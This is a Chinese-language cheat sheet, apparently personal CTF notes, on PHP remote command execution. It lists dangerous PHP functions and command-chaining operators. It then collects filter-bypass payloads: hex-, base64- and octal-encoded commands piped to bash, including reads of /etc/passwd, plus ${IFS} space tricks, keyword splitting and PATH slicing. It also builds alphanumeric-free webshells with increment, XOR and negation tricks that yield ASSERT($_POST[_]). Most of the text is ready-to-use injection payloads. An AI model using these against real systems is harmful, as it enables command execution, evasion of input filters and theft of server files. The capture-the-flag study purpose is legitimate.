---
weight: 999
title: "RCE"
description: ""
icon: "article"
date: "2025-05-30T10:12:11+08:00"
lastmod: "2025-05-30T10:12:11+08:00"
draft: false
toc: true
---

# PHP
## 基本函数

1.`eval()`可以将传入的字符串当作php代码执行
解题时常用的指令：`phpinfo()`查看是否有回显
system()指令用于执行系统命令，如
```php
system('ls');
system('cat');
//记得在每一条指令后面加；
```

其它函数：
```php
//具体函数内容查看手册
exec
shell_exec
passthru
popen
proc_popen
Assert(mixed $assertion,string $description = ?)
//会检查assertion，如果是字符串，会被当成php代码执行
Call_user_func(callable $callback …..)
//callback是被调用的回调函数
Call_user_func_array(callable $callback)
//同上
Creat_function(args,code)
//如
<?php
error_reporting(0);
$new_func = create_function('$a,$b','return "$a  "."$b";');//new_func为函数名，$a $b为参数，后面代码
echo $new_func('hello','hack')."\n";
?>
```

连接两个命令
```
|
||
&
&&
;
```

## 绕过
- 简单绕过关键词过滤`a=eval($_GET['A'])&A=system`
- 内联执行：cat \`ls\`，echo $(ls)
- 使用''包裹一组指令 `('ls /')`

绕过内置过滤函数
```php
$url=escapeshellarg($url);

$url=escapeshellcmd($url);
/*
连用会产生单引号逃逸，传入1' xxx
返回'1'\\''XXX\'
\被转义，还多出来一个'
*/
```

绕过文件名限制
```bash
cat /f*
# 过滤f l a g时，使用glob通配符绕过
# file:///D:/ctf/doc/Linux shell通配符_ glob.htm
more /[e-h][k-m][0-b][e-h]
# “ _[A-Fa-f0-9]_ ”相当于 " _[ABCDEFabcdef0123456789]_ ".)
# “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母”
```

编码绕过
```bash
# 回显只有数字情况下，使用od进行输出：
od -t d1 /flag
# 这是一个命令行指令，用于以十进制形式显示 /flag 文件的内容，具体来说-t 参数用于指定展示的数据格式，d1 表示每个数值使用一个字节来显示，即按字节读取。

# 16进制，先bin2hex
php -r eval(hex2bin(substr(_十六进制,1)))
# 63617420666c61672e706870是cat flag.php的16进制
# cat /etc/passwd
echo "636174202F6574632F706173737764" | xxd -r -p|bash
# php 十六进制绕过 system();
"\x73\x79\x73\x74\x65\x6d"();

# 或者base64/32
echo "base64编码"|base64 -d|bash
echo "base64编码"|base64 -d|sh
echo 'Y2F0wqAK' | base64 -d /etc/passwd # cat /etc/passwd
# 八进制
# ls
$(printf "\154\163")


```

绕过空格
```
%09（url传递）(tab)
%20(space)
${IFS}
$IFS$9
$IFS$1
<>（cat<>/flag）
<（cat</flag）
$IFS
{cat,flag}//花括号
/**/
```

绕过特定命令
```bash
# $1、$2等和 $@绕过
l$1s
ca$2t
fl$@ag

# '\'和'以及`绕过滤
ca\t flag
ca''t flag
ca""t flag 
ca``t flag

# 括号拼接
(sy.(st).em)();

# 注释
(sy./*A*/(st)/*A*/.em)/*A*/(wh./*A*/(oa)/*A*/.mi);

# 变量拆分，此方法同样用于命令拆分，用于php
a=c;b=a;c=t;$a$b$c flag.php
?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php

# 代替system
passthru

# 利用未初始化变量
cat /etc$u/passwd

# ;拼接绕过/
cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd

# path绕过
${PATH:5:1} # l
${PATH:2:1} # s
${PATH:5:1}${PATH:2:1} # 拼接后是ls,执行命令
${PATH:5:1}s # 拼接后是ls,执行命令

# 绕过括号
require '/flag'
echo `cat /flag`
```

cat打开文件过滤
```bash
more
# 一页一页的显示档案内容
less
# 与 more 类似
head
# 查看头几行
tac
# 从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail
# 查看尾几行
nl
# 显示的时候，顺便输出行号
od
# 以二进制的方式读取档案内容
vi
# 一种编辑器，可以查看
vim
# 一种编辑器，可以查看
sort
# 可以查看
uniq
# 可以查看
file -f
# 报错出具体内容
sh /flag 2>%261
# 报错出文件内容
```

自增
[参考文章](https://blog.csdn.net/qq_61778128/article/details/127063407)
'a'++ => 'b'，'b'++ => 'c'... 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。
数组（Array）的第一个字母就是大写A，而且第4个字母是小写a
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
 
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
 
$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

异或
[参考文章](https://blog.csdn.net/qq_61778128/article/details/127063407)

```python
# 对字符串进行异或操作时，php解析时会将异或结果自动转换为字符串，以其给$_赋值，再通过拼接获取payload
"""
然后将需要的命令拼接出来。
列如：phpinfo()
('GGGGGGG'^'7/7.)!(')();
 其中'G'^'7'=p，'G'^'/'=h…………依次类推拼出你想得到的命令。
在有时候，字母和输入全被过滤掉的时候，可以用不可打印字符来进行命令执行。可以稍微改一下上边的脚本，将字符url编码之后再输出，这时候就能绕过去了。
"""
def xor():
    for i in range(0,128):
        for j in range(0,128):
            result=i^j
            print(chr(i)+'  ^  '+chr(j)+' == >  '+chr(result)+" ASCII:"+str(result))
if __name__ == "__main__":
    xor()


# 或者这个脚本
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
​
answer = str(input("请输入进行异或构造的字符串："))
​
tmp1, tmp2 = '', ''
for c in answer:
  for i in valid:
    for j in valid:
      if (ord(i) ^ ord(j) == ord(c)):
        tmp1 += i
        tmp2 += j
        break
    else:
      continue
    break
print("tmp1为:",tmp1)
print("tmp2为:",tmp2)
```

取反
[参考文章](https://blog.csdn.net/qq_61778128/article/details/127063407)
```php
echo urlencode(~'phpinfo');
# system();
(~%8C%86%8C%8B%9A%92)();

# /flag
<?=require~%d0%99%93%9e%98?>
```